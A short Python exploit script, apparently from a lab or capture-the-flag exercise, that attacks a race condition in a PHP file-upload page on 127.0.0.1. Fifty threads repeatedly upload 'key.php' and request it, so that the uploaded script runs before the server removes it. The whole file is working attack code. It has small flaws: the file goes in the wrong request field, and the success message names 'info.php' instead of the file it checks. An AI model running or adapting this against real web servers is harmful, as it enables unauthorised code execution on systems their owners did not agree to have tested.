import requests
import threading
import os


class RaceCondition(threading.Thread):
    """docstring for RaceCondition."""

    def __init__(self):
        super(RaceCondition, self).__init__()
        self.uploadurl = "http://127.0.0.1/uploads/upload.php"
        self.url = "http://127.0.0.1/uploads/key.php"

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print('[*] creat file info.php success.')
            os._exit(0)

    def _upload(self):
        print('upload file ...')
        file = {'myfile': open('./key.php', 'r')}
        requests.post(self.uploadurl, data=file)

    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._upload()
                self._get()


if __name__ == '__main__':
    threads = []

    for i in range(50):
        t = RaceCondition()
        threads.append(t)

    for t in threads:
        t.start()
    for t in threads:
        t.join()
